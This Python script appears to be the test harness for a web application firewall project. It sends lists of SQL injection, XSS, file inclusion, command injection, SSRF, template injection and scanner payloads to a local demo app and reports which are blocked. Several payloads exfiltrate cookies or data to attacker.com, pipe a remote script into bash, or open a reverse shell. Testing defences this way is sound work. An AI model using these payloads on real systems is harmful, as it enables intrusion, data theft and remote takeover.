"""
CyberGAN WAF — Real Attack Tester
Sends actual attack payloads to the demo app.
These are REAL attack strings used in production attacks.

Run AFTER starting:
  1. python main.py dashboard     (dashboard on :8443)
  2. python demo_app.py           (target app on :8000)

Then:
  python attack_tester.py         (fires real attacks)

Watch the CyberGAN dashboard light up with real detections.
"""

import asyncio
import aiohttp
import time
import json

TARGET = "http://127.0.0.1:8000"

# ── Real attack payloads ──────────────────────────────────────

SQL_INJECTION_ATTACKS = [
    ("/users/search?name=admin' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--", "GET", None),
    ("/users/search?name=' OR '1'='1", "GET", None),
    ("/users/search?name=1; DROP TABLE users--", "GET", None),
    ("/users/search?name=admin' AND SLEEP(5)--", "GET", None),  # Time-based blind
    ("/users/search?name=' OR 1=1 LIMIT 1 OFFSET 0--", "GET", None),
    ("/login?username=admin'--&password=x", "GET", None),
    ("/users/search?name=1' AND EXTRACTVALUE(1,CONCAT(0x7e,DATABASE()))--", "GET", None),  # Error-based
]

XSS_ATTACKS = [
    ("/comments", "POST", {"text": "<script>alert(document.cookie)</script>"}),
    ("/comments", "POST", {"text": "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>"}),
    ("/comments", "POST", {"text": "javascript:alert(1)"}),
    ("/comments", "POST", {"text": "<svg onload=fetch('https://attacker.com/steal?c='+document.cookie)>"}),
    ("/comments", "POST", {"text": "<body onload=document.location='https://phishing.com'>"}),
    ("/users/search?name=<script>document.write('<img src=x onerror=alert(1)>')</script>", "GET", None),
    ("/comments", "POST", {"text": "';alert(String.fromCharCode(88,83,83))//"}),
]

LFI_ATTACKS = [
    ("/files?path=../../../../etc/passwd", "GET", None),
    ("/files?path=../../../../etc/shadow", "GET", None),
    ("/files?path=..%2F..%2F..%2Fetc%2Fpasswd", "GET", None),  # URL encoded
    ("/files?path=....//....//....//etc/passwd", "GET", None),  # Double dot bypass
    ("/files?path=php://filter/convert.base64-encode/resource=index.php", "GET", None),
    ("/files?path=/proc/self/environ", "GET", None),
    ("/files?path=....%5c....%5c....%5cetc%5cpasswd", "GET", None),  # Windows-style
]

RCE_ATTACKS = [
    ("/run", "POST", {"cmd": "echo hello; cat /etc/passwd"}),
    ("/run", "POST", {"cmd": "ls -la / | wget http://attacker.com --post-data @-"}),
    ("/run", "POST", {"cmd": "`id`"}),
    ("/run", "POST", {"cmd": "$(whoami)"}),
    ("/run", "POST", {"cmd": "echo hello && curl http://attacker.com/shell.sh | bash"}),
    ("/run", "POST", {"cmd": "python3 -c 'import os; os.system(\"id\")' "}),
    ("/run", "POST", {"cmd": "bash -i >& /dev/tcp/attacker.com/4444 0>&1"}),  # Reverse shell
    ("/run", "POST", {"cmd": "perl -e 'use Socket;...;exec(\"/bin/bash\")' "}),
]

SSRF_ATTACKS = [
    ("/ping", "POST", {"url": "http://127.0.0.1:6379"}),  # Redis
    ("/ping", "POST", {"url": "http://169.254.169.254/latest/meta-data/"}),  # AWS metadata
    ("/ping", "POST", {"url": "http://metadata.google.internal/computeMetadata/v1/"}),
    ("/ping", "POST", {"url": "gopher://127.0.0.1:25/xEHLO localhost"}),
    ("/ping", "POST", {"url": "dict://127.0.0.1:11211/stat"}),  # Memcached
    ("/ping", "POST", {"url": "file:///etc/passwd"}),
    ("/ping", "POST", {"url": "http://0.0.0.0:22"}),
]

SCANNER_ATTACKS = [
    # Simulate automated scanners
    ("/", "GET", None),
    ("/admin", "GET", None),
    ("/.git/config", "GET", None),
    ("/wp-admin/", "GET", None),
    ("/phpMyAdmin/", "GET", None),
    ("/.env", "GET", None),
    ("/api/v1/../../../etc/passwd", "GET", None),
]

SSTI_ATTACKS = [
    ("/users/search?name={{7*7}}", "GET", None),
    ("/users/search?name=${7*7}", "GET", None),
    ("/comments", "POST", {"text": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"}),
    ("/users/search?name=#{7*7}", "GET", None),
]

ALL_ATTACKS = [
    ("SQL Injection", SQL_INJECTION_ATTACKS),
    ("XSS", XSS_ATTACKS),
    ("Local File Inclusion", LFI_ATTACKS),
    ("Remote Code Execution", RCE_ATTACKS),
    ("SSRF", SSRF_ATTACKS),
    ("SSTI", SSTI_ATTACKS),
    ("Scanner / Recon", SCANNER_ATTACKS),
]


async def send_attack(session: aiohttp.ClientSession, path: str, method: str, body: dict | None, category: str) -> dict:
    url = f"{TARGET}{path}"
    start = time.time()
    status = 0
    blocked = False

    try:
        if method == "GET":
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                status = resp.status
                blocked = status == 403
        elif method == "POST":
            async with session.post(url, json=body, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                status = resp.status
                blocked = status == 403
    except aiohttp.ClientConnectorError:
        return {"error": "Connection refused — is demo_app.py running?", "path": path}
    except Exception as e:
        status = 0

    latency = int((time.time() - start) * 1000)
    result = "🛑 BLOCKED" if blocked else ("⚠️  PASSED" if status < 500 else "❌ ERROR")
    payload_preview = path[:60] + ("..." if len(path) > 60 else "")
    print(f"    {result} [{status}] {method:4s} {payload_preview} ({latency}ms)")
    return {"blocked": blocked, "status": status, "latency": latency}


async def main():
    print("\n" + "═" * 60)
    print("  CyberGAN WAF — Real Attack Tester")
    print("  Sending real attack payloads to the demo app")
    print("═" * 60)
    print(f"  Target:    {TARGET}")
    print(f"  Dashboard: http://127.0.0.1:8443")
    print("═" * 60)

    # Check connectivity
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(f"{TARGET}/health", timeout=aiohttp.ClientTimeout(total=3)) as r:
                if r.status != 200:
                    print("\n  ❌ Demo app not responding. Run: python demo_app.py\n")
                    return
        except Exception:
            print("\n  ❌ Cannot connect to demo_app.py")
            print("  Run first: python demo_app.py\n")
            return

    print("\n  ✅ Target reachable. Starting attacks...\n")

    total = 0
    blocked_count = 0
    passed_count = 0

    async with aiohttp.ClientSession() as session:
        for category, attacks in ALL_ATTACKS:
            print(f"\n  ── {category} ──────────────────────────────────────")
            for path, method, body in attacks:
                result = await send_attack(session, path, method, body, category)
                if "error" in result:
                    print(f"  {result['error']}")
                    return
                total += 1
                if result.get("blocked"):
                    blocked_count += 1
                else:
                    passed_count += 1
                await asyncio.sleep(0.15)  # Small delay between attacks

    print("\n" + "═" * 60)
    print("  Results:")
    print(f"  Total attacks:    {total}")
    print(f"  Blocked by WAF:   {blocked_count} ({blocked_count/total*100:.0f}%)")
    print(f"  Passed through:   {passed_count}")
    print(f"\n  Check dashboard:  http://127.0.0.1:8443")
    print("═" * 60 + "\n")


if __name__ == "__main__":
    asyncio.run(main())
